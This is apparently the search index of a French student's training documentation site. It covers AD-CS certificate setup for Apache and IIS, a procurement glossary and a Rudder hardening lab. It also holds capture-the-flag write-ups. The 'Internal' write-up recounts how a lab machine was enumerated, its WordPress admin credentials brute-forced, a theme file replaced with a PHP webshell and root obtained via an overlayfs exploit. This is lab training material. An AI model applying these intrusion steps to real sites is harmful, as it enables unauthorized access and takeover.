{"config":{"lang":["fr"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Bienvenue sur la documentation de Nathan Etinzon","text":"<p>Site compilant la documentation faite par Nathan Etinzon dans le cadre de la formation au CEFIM.</p>"},{"location":"AD-CS_Certificat_Apache/","title":"AD-CS Certificat apache","text":""},{"location":"AD-CS_Certificat_Apache/#1ere-etape-generation-du-cle-avec-openssl","title":"1\u00e8re \u00e9tape : G\u00e9n\u00e9ration du cl\u00e9 avec openssl","text":"<p>Cr\u00e9ation de la cl\u00e9</p> <p>cd /etc/ssl/private sudo openssl genrsa -out www.etinzon.cefim.key 2048</p>"},{"location":"AD-CS_Certificat_Apache/#2eme-etape-creation-dun-fichier-de-conf-avec-les-subjectaltname","title":"2\u00e8me \u00e9tape : Cr\u00e9ation d'un fichier de conf avec les subjectAltName","text":"<p>Cr\u00e9ation du fichier de conf avec les SubjectAltName</p> <p>cd /etc/ssl nano www.etinzon.cefim.conf</p> <p>[req] default_bits = 2048 prompt = no default_md = sha256 req_extensions = req_ext distinguished_name = dn [ dn ] C=FR ST=Tours L=CVDL O=IT  OU=Testing Domain emailAddress=admin@www.etinzon.cefim CN = www.etinzon.cefim [ req_ext ] subjectAltName = @alt_names [ alt_names ] DNS.1 = etinzon.cefim DNS.2 = www.etinzon.cefim  </p>"},{"location":"AD-CS_Certificat_Apache/#3eme-etape-creation-du-csr-avec-le-fichier-de-conf","title":"3\u00e8me \u00e9tape : Cr\u00e9ation du csr avec le fichier de conf","text":"<p>On se place \u00e0 l'endroit o\u00f9 est la cl\u00e9, on indique que l'on veut un certificat csr avec comme config le fichier de conf cr\u00e9e auparavant</p> <p>cd /etc/ssl/private  openssl req -new -key www.etinzon.cefim.key -out www.etinzon.cefim.csr -config ../www.etinzon.cefim.conf</p>"},{"location":"AD-CS_Certificat_Apache/#4eme-etape-importer-le-csr-sur-lad-cs","title":"4\u00e8me \u00e9tape : Importer le csr sur l'AD-CS","text":"<p>Partage r\u00e9seau / Winscp / VMtools</p>"},{"location":"AD-CS_Certificat_Apache/#5eme-etape-signer-le-csr-avec-lauthorite-de-certification","title":"5\u00e8me \u00e9tape : Signer le csr avec l'authorit\u00e9 de certification","text":"<p>Se d\u00e9placer dans l'emplacement o\u00f9 a \u00e9t\u00e9 depos\u00e9 le .csr, ensuite lancer une requ\u00eate afin de signer le certificat et obtenir un .cer</p> <p>cd ./desktop certreq -submit -attrib \"CertificateTemplate:WebServer\" www.etinzon.cefim.csr</p> <p></p> <p>Ensuite, donner un nom au fichier. Exemple : www.etinzon.cefim</p> <p></p>"},{"location":"AD-CS_Certificat_Apache/#6eme-etape-importer-le-cer-dans-lapache","title":"6\u00e8me \u00e9tape : Importer le .cer dans l'apache","text":"<p>Partage r\u00e9seau / Winscp / VMtools</p> <p>Deposer le .cer dans /etc/ssl/cert</p> <p></p>"},{"location":"AD-CS_Certificat_Apache/#7eme-etape-configuration-dapache","title":"7\u00e8me \u00e9tape : Configuration d'apache","text":"<p>Mettre le bon path pour chaque certificat</p> <p>cd /etc/apache2/sites-available nano default-ssl.conf</p> <p>SSLCertificateFile  /etc/ssl/certs/www.etinzon.cefim.cer SSLCertificateKeyFile   /etc/ssl/private/www.etinzon.cefim.key</p> <p></p> <p>systemctl restart apache2</p>"},{"location":"AD-CS_Certificat_Apache/#resultat","title":"R\u00e9sultat","text":""},{"location":"AD-CS_Certificat_IIS/","title":"AD-CS Certificat IIS","text":"<p>/!\\ Remplacer les diff\u00e9rentes informations par les votres /!\\</p>"},{"location":"AD-CS_Certificat_IIS/#1ere-etape-generation-de-la-requete-de-certificat","title":"1\u00e8re \u00e9tape : G\u00e9n\u00e9ration de la requ\u00eate de certificat","text":"<p>Sur le serveur IIS</p> <p>Dans la console de gestion de IIS, ouvrir la console Certificat, faire un clic-droit et s\u00e9lectionner Cr\u00e9er une demande de certificat </p> <p>Renseigner les informations suivantes. </p> <p>S\u00e9lectionner le param\u00e9trage ci-dessous. </p> <p>Renseigner le dossier et de nom o\u00f9 se trouvera la requ\u00eate.  </p>"},{"location":"AD-CS_Certificat_IIS/#2eme-etape-recuperation-de-la-requete","title":"2\u00e8me \u00e9tape : R\u00e9cup\u00e9ration de la requ\u00eate","text":"<p>Sur le serveur AD-CS Via Partage r\u00e9seau / Winscp / VMtools</p>"},{"location":"AD-CS_Certificat_IIS/#3eme-etape-creation-du-certificat","title":"3\u00e8me \u00e9tape : Cr\u00e9ation du certificat","text":"<p>Sur le serveur AD-CS</p> <p>Sur PowerShell, entrer les commandes suivantes : certutil -setreg policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2 /!\\ R\u00e9demarrer le service sinon les modifications ne seront pas prises en compte /!\\  </p> <p>Ensuite :  certreq -submit -attrib \"CertificateTemplate:webServer\\nSAN:dns=Ton_FQDN&amp;ipaddress=IP_IIS\" Requ\u00eate.txt</p> <p>S\u00e9lectionner l'autorit\u00e9 de certification. </p> <p>Enregistrer le certificat en .cer </p>"},{"location":"AD-CS_Certificat_IIS/#4eme-etape-recuperation-du-certificat","title":"4\u00e8me \u00e9tape : R\u00e9cup\u00e9ration du certificat","text":"<p>Sur le serveur IIS Partage r\u00e9seau / Winscp / VMtools</p>"},{"location":"AD-CS_Certificat_IIS/#5eme-etape-importation-du-certificat","title":"5\u00e8me \u00e9tape : Importation du certificat","text":"<p>Sur le serveur IIS</p> <p>Dans la console de gestion de IIS, ouvrir la console Certificat, faite un clic-droit et s\u00e9lectionner Terminer une demande de certificat. </p> <p>S\u00e9lectionner le certificat. </p>"},{"location":"AD-CS_Certificat_IIS/#6eme-etape-debugage-certificat-fantome","title":"6\u00e8me \u00e9tape : D\u00e9bugage certificat fant\u00f4me","text":"<p>Sur le serveur IIS (Si le certificat disparait d\u00e8s que la console est actualis\u00e9e, suivez les \u00e9tapes suivantes)</p> <p>Dans la console de certificat, dans le magasin H\u00e9bergement Web, rechercher le num\u00e9ro de s\u00e9rie de votre certificat et le copier. </p> <p>Sous PowerShell, entrer la commande suivante : certutil -repairstore webHosting Serial_Number</p> <p>R\u00e9sultat : </p> <p>Rafraichir la console IIS et le certificat devrait r\u00e9appara\u00eetre.</p>"},{"location":"AD-CS_Certificat_IIS/#7eme-etape-liaison-https","title":"7\u00e8me \u00e9tape : Liaison HTTPS","text":"<p>Sur le serveur IIS</p> <p>Dans la console de gestion de IIS, faire un clic-droit sur le VHost et s\u00e9lectionner Modifier les liaisons. </p> <p>Cr\u00e9er la liaison suivante en s\u00e9lectionnant le certificat r\u00e9cemment import\u00e9. </p>"},{"location":"AD-CS_Certificat_IIS/#8eme-etape-redirection-http-https","title":"8\u00e8me \u00e9tape : Redirection HTTP =&gt; HTTPS","text":"<p>Superbe proc\u00e9dure : https://www.ssl.com/how-to/redirect-http-to-https-with-windows-iis-10/</p>"},{"location":"AD-CS_Certificat_IIS/#resultat","title":"R\u00e9sultat","text":""},{"location":"Gestion_de_projet_Definition/","title":"Gestion de projet | D\u00e9finition","text":""},{"location":"Gestion_de_projet_Definition/#aac-avis-dappel-a-la-concurrence","title":"AAC (Avis d'Appel \u00e0 la Concurrence)","text":"<p>L'avis de march\u00e9 est un avis d'appel \u00e0 la concurrence (AAC) est une annonce publi\u00e9e par le pouvoir adjudicateur ou l\u2019entit\u00e9 adjudicatrice destin\u00e9e \u00e0 informer les candidats potentiels \u00e0 un march\u00e9 des principales caract\u00e9ristiques de ce dernier</p>"},{"location":"Gestion_de_projet_Definition/#aapc-appel-doffres-public-ou-procedure-adaptee","title":"AAPC (Appel d'Offres Public ou Proc\u00e9dure Adapt\u00e9e)","text":"<p>Processus par lequel une entit\u00e9 publique demande des offres de la part de diff\u00e9rents fournisseurs ou prestataires pour r\u00e9pondre \u00e0 un besoin sp\u00e9cifique.</p>"},{"location":"Gestion_de_projet_Definition/#aapc-avis-dappel-public-a-la-concurrence","title":"AAPC (Avis d'Appel Public \u00e0 la Concurrence)","text":"<p>L'avis d'appel public \u00e0 la concurrence (AAPC) avait \u00e9t\u00e9 renomm\u00e9 avis d'appel \u00e0 la concurrence (AAC) avec la r\u00e9forme des march\u00e9s publics de 2016.</p>"},{"location":"Gestion_de_projet_Definition/#accord-cadre","title":"Accord Cadre","text":"<p>Contrat \u00e9tabli entre une entit\u00e9 publique et un ou plusieurs fournisseurs pour fixer les termes et les conditions r\u00e9gissant les commandes ult\u00e9rieures sur une p\u00e9riode d\u00e9finie.</p>"},{"location":"Gestion_de_projet_Definition/#adjudicataire","title":"Adjudicataire","text":"<p>Entit\u00e9 ou personne \u00e0 qui est attribu\u00e9 un contrat \u00e0 la suite d'une proc\u00e9dure d'adjudication (ex : appel d'offres) dans le cadre d'un march\u00e9 public.</p>"},{"location":"Gestion_de_projet_Definition/#ae-autorisation-dengagement","title":"AE (Autorisation d'Engagement)","text":"<p>Validation administrative permettant de r\u00e9server une somme budg\u00e9taire pour un projet, sans que les d\u00e9penses soient effectivement engag\u00e9es.</p>"},{"location":"Gestion_de_projet_Definition/#amoa-assistance-a-maitrise-douvrage","title":"AMOA (Assistance \u00e0 Ma\u00eetrise d'Ouvrage)","text":"<p>Service d'assistance externe apport\u00e9 au ma\u00eetre d'ouvrage pour l'aider dans la gestion, le suivi et la r\u00e9alisation d'un projet.</p>"},{"location":"Gestion_de_projet_Definition/#amoe-assistance-a-maitrise-duvre","title":"AMOE (Assistance \u00e0 Ma\u00eetrise d'\u0152uvre)","text":"<p>Prestation d'assistance apport\u00e9e au ma\u00eetre d'\u0153uvre dans la r\u00e9alisation technique d'un projet.</p>"},{"location":"Gestion_de_projet_Definition/#attri2","title":"ATTRI2","text":"<p>Un mod\u00e8le de d\u00e9claration de sous-traitance propos\u00e9 par la Direction des Affaires Juridiques (DAJ) du minist\u00e8re de l'\u00e9conomie et des finances.</p>"},{"location":"Gestion_de_projet_Definition/#boamp-bulletin-officiel-des-annonces-des-marches-publics","title":"BOAMP (Bulletin Officiel des Annonces des March\u00e9s Publics)","text":"<p>Plateforme officielle en France regroupant les annonces et informations relatives aux march\u00e9s publics.</p>"},{"location":"Gestion_de_projet_Definition/#bpu-bordereau-des-prix-unitaires","title":"BPU (Bordereau des Prix Unitaires)","text":"<p>Document d\u00e9taillant les prix unitaires des diff\u00e9rents postes ou \u00e9l\u00e9ments d'un march\u00e9, utilis\u00e9 pour \u00e9valuer les co\u00fbts.</p>"},{"location":"Gestion_de_projet_Definition/#ccap-cahier-des-clauses-administratives-particulieres","title":"CCAP (Cahier des Clauses Administratives Particuli\u00e8res)","text":"<p>Document faisant partie du dossier de consultation d'un march\u00e9 public, il d\u00e9finit les conditions administratives sp\u00e9cifiques au contrat.</p>"},{"location":"Gestion_de_projet_Definition/#cctp-cahier-des-clauses-techniques-particulieres","title":"CCTP (Cahier des Clauses Techniques Particuli\u00e8res)","text":"<p>Document d\u00e9taillant les sp\u00e9cifications techniques et les exigences pour la r\u00e9alisation d'un projet ou d'un march\u00e9 public.</p>"},{"location":"Gestion_de_projet_Definition/#cgafcs","title":"CGAFCS","text":"<p>Conditions g\u00e9n\u00e9rales d\u2019achat applicables aux fournitures courantes et services.</p>"},{"location":"Gestion_de_projet_Definition/#cmp-code-des-marches-publics","title":"CMP (Code des March\u00e9s Publics)","text":"<p>Ensemble de r\u00e8gles et de principes r\u00e9gissant les march\u00e9s publics en France.</p>"},{"location":"Gestion_de_projet_Definition/#critere","title":"Crit\u00e8re","text":"<p>\u00c9l\u00e9ment \u00e9valu\u00e9 pour prendre une d\u00e9cision dans le cadre d'une proc\u00e9dure de s\u00e9lection (ex : crit\u00e8res de qualit\u00e9, prix, etc.).</p>"},{"location":"Gestion_de_projet_Definition/#dc1-dc2-dc4-declaration-du-candidat","title":"DC1, DC2, DC4 (D\u00e9claration du Candidat)","text":"<p>Documents administratifs utilis\u00e9s lors des appels d'offres pour v\u00e9rifier l'\u00e9ligibilit\u00e9 des entreprises \u00e0 soumissionner pour un march\u00e9 public.</p>"},{"location":"Gestion_de_projet_Definition/#dqe-detail-quantitatif-et-estimatif","title":"DQE (D\u00e9tail Quantitatif et Estimatif)","text":"<p>Document d\u00e9taillant les quantit\u00e9s et les estimations de co\u00fbts pour chaque \u00e9l\u00e9ment d'un march\u00e9 public.</p>"},{"location":"Gestion_de_projet_Definition/#dpgf-decomposition-du-prix-global-et-forfaitaire","title":"DPGF (D\u00e9composition du Prix Global et Forfaitaire)","text":"<p>Document d\u00e9taillant le prix total et forfaitaire d'un march\u00e9 public, d\u00e9compos\u00e9 en diff\u00e9rents \u00e9l\u00e9ments.</p>"},{"location":"Gestion_de_projet_Definition/#dume-document-unique-de-marche-europeen","title":"DUME (Document Unique de March\u00e9 Europ\u00e9en)","text":"<p>Formulaire standardis\u00e9 utilis\u00e9 par les entreprises pour d\u00e9montrer leur \u00e9ligibilit\u00e9 lors de candidatures pour des march\u00e9s publics.</p>"},{"location":"Gestion_de_projet_Definition/#lot","title":"Lot","text":"<p>Partie distincte et identifi\u00e9e d'un march\u00e9 public, pouvant \u00eatre attribu\u00e9e s\u00e9par\u00e9ment.</p>"},{"location":"Gestion_de_projet_Definition/#marche-a-bons-de-commandes","title":"March\u00e9 \u00e0 bons de commandes","text":"<p>Contrat-cadre o\u00f9 un acheteur s'engage \u00e0 acheter des biens ou des services \u00e0 un fournisseur \u00e0 des conditions d\u00e9finies \u00e0 l'avance.</p>"},{"location":"Gestion_de_projet_Definition/#marche-public-de-travaux-exemple-en-it","title":"March\u00e9 public de travaux (exemple en IT)","text":"<p>Dans le domaine des technologies de l'information, un march\u00e9 public de travaux pourrait \u00eatre l'installation ou la mise en place d'une infrastructure r\u00e9seau dans un b\u00e2timent public.</p>"},{"location":"Gestion_de_projet_Definition/#marche-public-de-services-exemple-en-it","title":"March\u00e9 public de services (exemple en IT)","text":"<p>La maintenance et la gestion des syst\u00e8mes informatiques d'une administration publique pourraient constituer un exemple de march\u00e9 public de services en informatique.</p>"},{"location":"Gestion_de_projet_Definition/#marche-public-mixte","title":"March\u00e9 public mixte","text":"<p>Contrat qui combine diff\u00e9rents types de prestations ou de produits dans un seul march\u00e9 public.</p>"},{"location":"Gestion_de_projet_Definition/#mieux-disant","title":"Mieux Disant","text":"<p>Principe selon lequel le choix du prestataire dans un march\u00e9 public ne se fait pas seulement sur des crit\u00e8res financiers mais aussi sur des crit\u00e8res de qualit\u00e9 et de pertinence de l'offre.</p>"},{"location":"Gestion_de_projet_Definition/#procedure-allegee","title":"Proc\u00e9dure All\u00e9g\u00e9e","text":"<p>Proc\u00e9dure simplifi\u00e9e pour la passation de certains types de march\u00e9s publics, g\u00e9n\u00e9ralement adapt\u00e9e \u00e0 des situations sp\u00e9cifiques et d\u00e9finie par la r\u00e9glementation.</p>"},{"location":"Gestion_de_projet_Definition/#pse-prestations-supplementaires-eventuelles","title":"PSE (Prestations Suppl\u00e9mentaires \u00c9ventuelles)","text":"<p>Services ou travaux additionnels pouvant \u00eatre demand\u00e9s par le pouvoir adjudicateur apr\u00e8s la conclusion du contrat initial.</p>"},{"location":"Gestion_de_projet_Definition/#publicite","title":"Publicit\u00e9","text":"<p>Obligation pour les acheteurs publics de publier des informations sur les march\u00e9s publics afin d'assurer la transparence et l'acc\u00e8s \u00e9quitable aux opportunit\u00e9s commerciales.</p>"},{"location":"Gestion_de_projet_Definition/#rc-reglement-de-consultation","title":"RC (R\u00e8glement de Consultation)","text":"<p>Document d\u00e9crivant les r\u00e8gles et les modalit\u00e9s de la consultation pour un march\u00e9 public, incluant les informations n\u00e9cessaires aux soumissionnaires pour pr\u00e9senter leurs offres.</p>"},{"location":"ITIL_Etinzon_Nathan/","title":"D\u00e9ploiement de Rudder","text":""},{"location":"ITIL_Etinzon_Nathan/#contexte","title":"Contexte","text":"<p>Vous \u00eates un administrateur syst\u00e8me dans une entreprise qui souhaite am\u00e9liorer sa gestion des services informatiques en adoptant les principes ITIL. Votre mission consiste \u00e0 configurer et \u00e0 utiliser Rudder pour automatiser la gestion des configurations, renforcer la s\u00e9curit\u00e9, installer des applications et g\u00e9rer les utilisateurs.</p>"},{"location":"ITIL_Etinzon_Nathan/#1ere-etape-installation-et-configuration-du-serveur-rudder","title":"1\u00e8re \u00e9tape : Installation et Configuration du Serveur Rudder","text":""},{"location":"ITIL_Etinzon_Nathan/#11-installation","title":"1.1 Installation","text":"<p>Installez Rudder Server sur la machine virtuelle serveur d\u00e9di\u00e9e</p> <p>sudo wget --quiet -O /etc/apt/trusted.gpg.d/rudder_apt_key.gpg \"https://repository.rudder.io/apt/rudder_apt_key.gpg\"</p> <p>sudo nano /etc/apt/sources.list.d/rudder.list</p> <p>Ajouter la ligne : deb [trusted=yes] http://repository.rudder.io/apt/8.0/ jammy main</p> <p>sudo apt-get update</p> <p>sudo apt-get install rudder-server</p> <p>sudo apt-get upgrade</p> <p>rudder server create-user -u n.etinzon</p>"},{"location":"ITIL_Etinzon_Nathan/#12-validation","title":"1.2 Validation","text":"<p>Connectez-vous \u00e0 l'interface web de Rudder, v\u00e9rifiez l'\u00e9tat du serveur et assurez-vous qu'il est pr\u00eat \u00e0 communiquer avec les agents.</p> <p></p>"},{"location":"ITIL_Etinzon_Nathan/#2eme-etape-installation-et-configuration-dun-agent-rudder","title":"2\u00e8me \u00e9tape : Installation et Configuration d'un Agent Rudder","text":""},{"location":"ITIL_Etinzon_Nathan/#21-machine-client-linux","title":"2.1 Machine client Linux","text":"<p>Installez l'agent Rudder sur la machine cliente Linux, et configurez-la pour qu'elle communique avec le serveur.</p> <p>sudo wget --quiet -O /etc/apt/trusted.gpg.d/rudder_apt_key.gpg \"https://repository.rudder.io/apt/rudder_apt_key.gpg\"</p> <p>sudo nano /etc/apt/sources.list.d/rudder.list</p> <p>Ajouter la ligne : deb http://repository.rudder.io/apt/8.0/ jammy main</p> <p>sudo apt-get install rudder-agent</p> <p>rudder agent policy-server 163.172.163.218</p> <p>sudo rudder agent inventory</p>"},{"location":"ITIL_Etinzon_Nathan/#22-validation","title":"2.2 Validation","text":"<p>Assurez-vous que l'agent apparaisse dans l'interface web de Rudder et soit autoris\u00e9e.</p> <p></p>"},{"location":"ITIL_Etinzon_Nathan/#3eme-etape-renforcement-des-configurations-systemes","title":"3\u00e8me \u00e9tape : Renforcement des Configurations Syst\u00e8mes","text":""},{"location":"ITIL_Etinzon_Nathan/#31-technique-de-securite","title":"3.1 Technique de S\u00e9curit\u00e9","text":"<p>Sur les deux machines :</p> <p>Cr\u00e9ation de comptes : S'assurer que les compte,s \"user01\" et \"user02\" sont existants. User01 a un shell en \"bash\", user02 en \"nologin\". Les homes seront dans \"/home/nom_user\"</p> <p>sudo useradd -m -s /usr/bin/bash user01 sudo useradd -m -s /usr/bin/nologin user02</p> <p></p> <p>D\u00e9sactivation des comptes : S'assurer que le compte \"user02\" est d\u00e9sactiv\u00e9.</p> <p>sudo usermod -L user02</p> <p>Restriction des permissions root : user01\" doit avoir le droit d'utiliser sudo, uniquement pour consulter les log dans \"/var/log/syslog\".</p> <p>sudo nano /etc/sudoers Ajouter les lignes :</p> <p>#Allow user1 to view /var/log/syslog user1   ALL=(root) /bin/nano var/log/syslog/*</p> <p>Configuration du Pare-feu : Autoriser uniquement les ports 22 (SSH), 80 (HTTP), 5309 et 443 (HTTPS). Bloquer tous les autres ports.</p> <p>sudo ufw allow 22 sudo ufw allow 80 sudo ufw allow 5309 sudo ufw allow 443 sudo ufw enable</p> <p></p> <p>Mise \u00e0 jour des Packages : Appliquer toutes les mises \u00e0 jour de s\u00e9curit\u00e9 disponibles.</p> <p>sudo apt-get update sudo apt-get upgrade</p> <p>Installation de Packages : Installer \"fail2ban\" et \"apache2\" et s'assurer du d\u00e9marrage des services.</p> <p>sudo apt-get install apache2 sudo apt-get install fail2ban</p> <p></p> <p>D\u00e9ploiement de fichiers : D\u00e9ployer une page web contenant l'IP du serveur.</p> <p></p> <p>Renforcer la configuration SSH, mais sans rester dehors.</p> <p>G\u00e9n\u00e9rer une paire de cl\u00e9 sur la machine locale</p> <p>ssh-keygen cat ~/.ssh/id_rsa.pub Copier le contenu Sur l'h\u00f4te distant, coller la cl\u00e9 dans /home/n.etinzon/.ssh/authorized_keys Passer le param\u00e8tre PasswordAuthentification yes =&gt; PasswordAuthentification no dans /etc/ssh/ssh_config sudo nano /etc/ssh/ssh_config</p> <p></p>"},{"location":"ITIL_Etinzon_Nathan/#4eme-etape-audit-et-conformite","title":"4\u00e8me \u00e9tape : Audit et Conformit\u00e9","text":""},{"location":"ITIL_Etinzon_Nathan/#41-audit-des-configurations","title":"4.1 Audit des Configurations","text":"<p>Utilisez les fonctionnalit\u00e9s d'audit de Rudder pour v\u00e9rifier la conformit\u00e9 des machines avec les configurations souhait\u00e9es.</p> <p></p>"},{"location":"ITIL_Etinzon_Nathan/#42-rapport-de-conformite","title":"4.2 Rapport de Conformit\u00e9","text":"<p>G\u00e9n\u00e9rez un rapport de conformit\u00e9 \u00e0 partir de l'interface web de Rudder et analysez les r\u00e9sultats.</p> <p>Possibilit\u00e9 d'ajouter d'un module pour avoir un pdf.</p>"},{"location":"ITIL_Etinzon_Nathan/#5eme-etape-resolution-de-problemes-et-scenarios-pratiques","title":"5\u00e8me \u00e9tape : R\u00e9solution de Probl\u00e8mes et Sc\u00e9narios Pratiques","text":""},{"location":"ITIL_Etinzon_Nathan/#51-diagnostic","title":"5.1 Diagnostic","text":"<p>Diagnostiquez et r\u00e9solvez un probl\u00e8me de configuration sur l'une des machines, simul\u00e9 ou r\u00e9el.</p> <p></p>"},{"location":"ITIL_Etinzon_Nathan/#52-scenario-pratique","title":"5.2 Sc\u00e9nario Pratique","text":"<p>R\u00e9pondez \u00e0 une demande de changement fictive, en modifiant les configurations sur les machines via Rudder.</p> <p></p> <p></p> <p>R\u00e9sultat :</p> <p></p>"},{"location":"ITIL_Etinzon_Nathan/#6eme-etape-integration-avec-itil-amelioration-continue-et-recommandations","title":"6\u00e8me \u00e9tape : Int\u00e9gration avec ITIL, Am\u00e9lioration Continue et Recommandations","text":""},{"location":"ITIL_Etinzon_Nathan/#61-alignement-itil-analyse-et-recommandations","title":"6.1 Alignement ITIL, Analyse et Recommandations","text":"<p>Documentez comment les actions r\u00e9alis\u00e9es s'alignent avec les processus ITIL, en particulier la Gestion des Services et la Gestion des Configurations. Identifiez les domaines d'am\u00e9lioration et les recommandations dans la mani\u00e8re dont Rudder est utilis\u00e9 et proposez des actions concr\u00e8tes.</p> <p></p>"},{"location":"Internal_Write-Up/","title":"Internal Write-up","text":""},{"location":"Internal_Write-Up/#enumeration","title":"Enum\u00e9ration","text":""},{"location":"Internal_Write-Up/#nmap","title":"Nmap","text":""},{"location":"Internal_Write-Up/#commande","title":"Commande","text":"<p><code>nmap -T4 -sC -sV -Pn -p- 10.10.33.91</code></p>"},{"location":"Internal_Write-Up/#informations","title":"Informations","text":"<p>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA) |   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA) |_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (EdDSA) 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works</p>"},{"location":"Internal_Write-Up/#gobuster","title":"Gobuster","text":""},{"location":"Internal_Write-Up/#commandes","title":"Commandes","text":"<p><code>gobuster dir -u http://10.10.33.91/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100</code> <code>gobuster dir -u http://10.10.33.91/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100</code> <code>gobuster dir -u http://10.10.33.91/phpmyadmin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100</code> <code>gobuster dir -u http://10.10.33.91/blog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100</code></p>"},{"location":"Internal_Write-Up/#informations_1","title":"Informations","text":"<p>/wordpress (Status: 301)     /wp-content (Status: 301)     /wp-includes (Status: 301)     /wp-admin (Status: 301)     /wp-login.php  </p> <p>/javascript (Status: 301)  </p> <p>/blog (Status: 301)     /wp-content (Status: 301)     /wp-includes (Status: 301)     /wp-admin (Status: 301)     /wp-login.php  </p> <p>/phpmyadmin (Status: 301)     /themes (Status: 301)     /templates (Status: 403)     /doc (Status: 301)     /js (Status: 301)     /libraries (Status: 403)     /setup (Status: 401)     /sql (Status: 301)     /locale (Status: 301)  </p> <p>/server-status (Status: 403)  </p>"},{"location":"Internal_Write-Up/#wappalizer","title":"Wappalizer","text":""},{"location":"Internal_Write-Up/#informations_2","title":"Informations","text":"<p>Apache/2.4.29 WordPress/5.4.2 Theme : Twenty Seventeen phpMyAdmin Google Font API RSS CodeMirror Apache HTTP Server PHP MySQL jQuery jQuery UI jQuery Migrate  </p>"},{"location":"Internal_Write-Up/#wpscan","title":"WPScan","text":""},{"location":"Internal_Write-Up/#commande_1","title":"Commande","text":"<p><code>wpscan -h http://10.10.33.91/wordpress</code></p>"},{"location":"Internal_Write-Up/#informations_3","title":"Informations","text":"<p>[+] XML-RPC seems to be enabled: http://10.10.33.91/wordpress/xmlrpc.php  | Found By: Direct Access (Aggressive Detection)  | Confidence: 100%  | References:  |  - http://codex.wordpress.org/XML-RPC_Pingback_API  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner  |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login   &lt;= Succ\u00e8s  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access  </p> <p>[+] WordPress readme found: http://10.10.33.91/wordpress/readme.html  | Found By: Direct Access (Aggressive Detection)  | Confidence: 100%  </p> <p>[+] The external WP-Cron seems to be enabled: http://10.10.33.91/wordpress/wp-cron.php  | Found By: Direct Access (Aggressive Detection)  | Confidence: 60%  | References:  |  - https://www.iplocation.net/defend-wordpress-from-ddos  |  - https://github.com/wpscanteam/wpscan/issues/1299  </p> <p>[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).  | Found By: Emoji Settings (Passive Detection)  |  - http://10.10.33.91/wordpress/, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=5.4.2'  | Confirmed By: Meta Generator (Passive Detection)  |  - http://10.10.33.91/wordpress/, Match: 'WordPress 5.4.2'  </p>"},{"location":"Internal_Write-Up/#acces-initial","title":"Acc\u00e8s initial","text":"<ul> <li>Ajouter internal.thm dans /etc/host</li> <li>Acc\u00e8der \u00e0 http://10.10.33.91/wordpress/wp-login.php  </li> <li>Rentrer les identifiants \"admin:my2boys\" (r\u00e9cup\u00e9rer via metasploit auxiliary/scanner/http/wordpress_xmlrpc_login)  </li> <li>Naviguer vers \u201cAppearance &gt; Theme Editor &gt; 404.php\"</li> <li>Remplacer le code par un webshell php</li> <li>Lancer un listener (<code>nc -lvnp 4444</code>)</li> <li>Acc\u00e8der \u00e0 la page http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php</li> </ul>"},{"location":"Internal_Write-Up/#escalade-de-privilege","title":"Escalade de privil\u00e8ge","text":"<ul> <li>Upgrader du webshell vers un meterpreter</li> <li> <p>Executer post(multi/recon/local_exploit_suggester) R\u00e9sultat : </p> <ol> <li>exploit/linux/local/cve_2021_3493_overlayfs                         Yes                      The target appears to be vulnerable.  </li> <li>exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                 Yes                      The target is vulnerable.  </li> <li>exploit/linux/local/cve_2022_0995_watch_queue                        Yes                      The target appears to be vulnerable.  </li> <li>exploit/linux/local/docker_cgroup_escape                            Yes                      The target is vulnerable. IF host OS is Ubuntu, kernel version 4.15.0-112-generic is vulnerable  </li> <li>exploit/linux/local/nested_namespace_idmap_limit_priv_esc           Yes                      The target appears to be vulnerable.  </li> <li>exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.  </li> <li>exploit/linux/local/ptrace_traceme_pkexec_helper                    Yes                      The target appears to be vulnerable.  </li> <li>exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.  </li> <li>exploit/linux/local/sudo_baron_samedit                              Yes                      The target appears to be vulnerable. sudo 1.8.21.2 is a vulnerable build.  </li> <li>exploit/linux/local/sudoedit_bypass_priv_esc                        Yes                      The target appears to be vulnerable. Sudo 1.8.21p2.pre.3ubuntu1.2 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module  </li> </ol> </li> <li> <p>Test exploit/linux/local/cve_2021_3493_overlayfs</p> </li> <li>BINGO Du premier coup!</li> <li>On a un shell root, on fait ce que l'on veut</li> </ul>"},{"location":"Mr-Robot_Write-Up/","title":"Mr Robot Write-up","text":""},{"location":"Mr-Robot_Write-Up/#reconnaissance","title":"Reconnaissance","text":""},{"location":"Mr-Robot_Write-Up/#robotstxt","title":"robots.txt","text":"<p>User-agent: * fsocity.dic &lt;= Wordlist qui nous servira key-1-of-3.txt &lt;= Premier flag</p>"},{"location":"Mr-Robot_Write-Up/#enumeration","title":"Enum\u00e9ration","text":""},{"location":"Mr-Robot_Write-Up/#nmap","title":"Nmap","text":""},{"location":"Mr-Robot_Write-Up/#commande","title":"Commande","text":"<p><code>nmap -T4 -sC -sV -Pn -p- 10.10.37.192</code></p>"},{"location":"Mr-Robot_Write-Up/#informations","title":"Informations","text":"<p>PORT    STATE  SERVICE  VERSION 22/tcp  closed ssh 